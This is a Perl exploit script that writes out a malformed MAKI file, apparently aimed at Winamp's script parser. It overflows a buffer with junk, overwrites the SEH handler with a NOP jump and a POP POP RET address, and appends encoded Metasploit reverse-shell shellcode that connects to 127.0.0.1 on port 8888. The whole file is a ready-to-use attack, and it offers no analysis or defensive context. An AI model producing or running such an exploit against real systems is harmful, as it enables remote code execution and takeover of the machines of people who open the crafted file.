#!/usr/bin/perl

binmode STDOUT;

$| = 1;

$length = "\xFF\xFF"; # Large value to trigger the overflow
$function_name = "\x41"x16756; # Junk to overflow the buffer, kill the canary, and trigger an exception
$nop_jmp = "\x90\x90\xEB\x04"; # What we want to overwrite the address to the next handler with 
$pop_ret = "\xfd\x1d\x34\x7c"; # Address to a POP POP RET instruction in one of the modules

# windows/shell_reverse_tcp - 710 bytes
# https://metasploit.com/
# Encoder: x86/alpha_mixed
# VERBOSE=false, LHOST=127.0.0.1, LPORT=8888, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, 
# PrependMigrate=false, EXITFUNC=process, 
# AutoVerifySession=true
my $buf = 
"\x89\xe6\xdb\xd4\xd9\x76\xf4\x5d\x55\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x39\x6c\x7a\x48\x4b\x32\x37\x70\x35\x50" .
"\x65\x50\x63\x50\x4d\x59\x58\x65\x34\x71\x6b\x70\x53\x54" .
"\x4e\x6b\x72\x70\x34\x70\x6e\x6b\x30\x52\x54\x4c\x4c\x4b" .
"\x56\x32\x74\x54\x4e\x6b\x70\x72\x35\x78\x34\x4f\x38\x37" .
"\x73\x7a\x64\x66\x74\x71\x69\x6f\x4e\x4c\x65\x6c\x50\x61" .
"\x33\x4c\x47\x72\x74\x6c\x31\x30\x49\x51\x38\x4f\x64\x4d" .
"\x77\x71\x58\x47\x78\x62\x5a\x52\x36\x32\x73\x67\x4c\x4b" .
"\x76\x32\x44\x50\x4c\x4b\x70\x4a\x57\x4c\x6e\x6b\x32\x6c" .
"\x72\x31\x61\x68\x48\x63\x31\x58\x75\x51\x6b\x61\x50\x51" .
"\x6e\x6b\x63\x69\x51\x30\x36\x61\x4b\x63\x6c\x4b\x62\x69" .
"\x65\x48\x38\x63\x57\x4a\x73\x79\x4c\x4b\x45\x64\x4e\x6b" .
"\x36\x61\x48\x56\x65\x61\x6b\x4f\x4c\x6c\x4b\x71\x78\x4f" .
"\x64\x4d\x47\x71\x39\x57\x34\x78\x39\x70\x63\x45\x48\x76" .
"\x67\x73\x61\x6d\x39\x68\x47\x4b\x33\x4d\x36\x44\x63\x45" .
"\x58\x64\x76\x38\x4c\x4b\x52\x78\x54\x64\x63\x31\x49\x43" .
"\x53\x56\x4e\x6b\x56\x6c\x32\x6b\x4c\x4b\x51\x48\x77\x6c" .
"\x43\x31\x4e\x33\x4e\x6b\x76\x64\x4c\x4b\x36\x61\x6e\x30" .
"\x4e\x69\x61\x54\x67\x54\x75\x74\x53\x6b\x33\x6b\x65\x31" .
"\x63\x69\x51\x4a\x42\x71\x79\x6f\x69\x70\x43\x6f\x33\x6f" .
"\x42\x7a\x4c\x4b\x64\x52\x58\x6b\x6e\x6d\x53\x6d\x62\x48" .
"\x54\x73\x54\x72\x65\x50\x43\x30\x55\x38\x62\x57\x51\x63" .
"\x55\x62\x51\x4f\x76\x34\x35\x38\x50\x4c\x73\x47\x37\x56" .
"\x65\x57\x39\x6f\x38\x55\x4e\x58\x6a\x30\x33\x31\x67\x70" .
"\x45\x50\x47\x59\x59\x54\x46\x34\x62\x70\x53\x58\x44\x69" .
"\x4f\x70\x30\x6b\x67\x70\x69\x6f\x4a\x75\x42\x70\x32\x70" .
"\x32\x70\x72\x70\x63\x70\x32\x70\x73\x70\x62\x70\x53\x58" .
"\x78\x6a\x74\x4f\x6b\x6f\x59\x70\x59\x6f\x6b\x65\x4d\x47" .
"\x63\x5a\x64\x45\x30\x68\x31\x6f\x55\x50\x67\x70\x53\x31" .
"\x43\x58\x44\x42\x37\x70\x31\x32\x6f\x48\x6e\x69\x6a\x46" .
"\x50\x6a\x66\x70\x42\x76\x31\x47\x55\x38\x5a\x39\x4e\x45" .
"\x34\x34\x45\x31\x79\x6f\x79\x45\x4e\x65\x4f\x30\x72\x54" .
"\x36\x6c\x69\x6f\x32\x6e\x46\x68\x61\x65\x58\x6c\x42\x48" .
"\x48\x70\x4f\x45\x4c\x62\x31\x46\x39\x6f\x4a\x75\x70\x68" .
"\x61\x73\x70\x6d\x30\x64\x63\x30\x4b\x39\x49\x73\x50\x57" .
"\x36\x37\x46\x37\x75\x61\x38\x76\x53\x5a\x72\x32\x52\x79" .
"\x36\x36\x6b\x52\x69\x6d\x62\x46\x68\x47\x31\x54\x54\x64" .
"\x47\x4c\x33\x31\x55\x51\x6e\x6d\x51\x54\x74\x64\x32\x30" .
"\x6a\x66\x77\x70\x72\x64\x52\x74\x72\x70\x71\x46\x30\x56" .
"\x36\x36\x32\x66\x53\x66\x52\x6e\x70\x56\x70\x56\x52\x73" .
"\x42\x76\x42\x48\x30\x79\x78\x4c\x45\x6f\x4b\x36\x39\x6f" .
"\x6a\x75\x6d\x59\x6b\x50\x32\x6e\x36\x36\x47\x36\x59\x6f" .
"\x30\x30\x53\x58\x64\x48\x6b\x37\x77\x6d\x73\x50\x39\x6f" .
"\x49\x45\x4d\x6b\x38\x70\x38\x35\x6e\x42\x70\x56\x70\x68" .
"\x6f\x56\x4a\x35\x6f\x4d\x4f\x6d\x6b\x4f\x7a\x75\x75\x6c" .
"\x64\x46\x33\x4c\x75\x5a\x6d\x50\x59\x6b\x4d\x30\x31\x65" .
"\x54\x45\x4f\x4b\x71\x57\x72\x33\x51\x62\x42\x4f\x61\x7a" .
"\x45\x50\x30\x53\x79\x6f\x7a\x75\x41\x41";



my $maki =
"\x46\x47" .                              # Magic
"\x03\x04" .                              # Version
"\x17\x00\x00\x00" .                      # ???
"\x01\x00\x00\x00" .                      # Types count
"\x71\x49\x65\x51\x87\x0D\x51\x4A" .      # Types
"\x91\xE3\xA6\xB5\x32\x35\xF3\xE7" .

"\x01\x00\x00\x00".                       # Function count
"\x01\x01" .                              # Function 1
"\x00\x00" .                              # Dummy

$length .                                 # Length
$function_name .
$nop_jmp .
$pop_ret .
$buf;

print $maki;
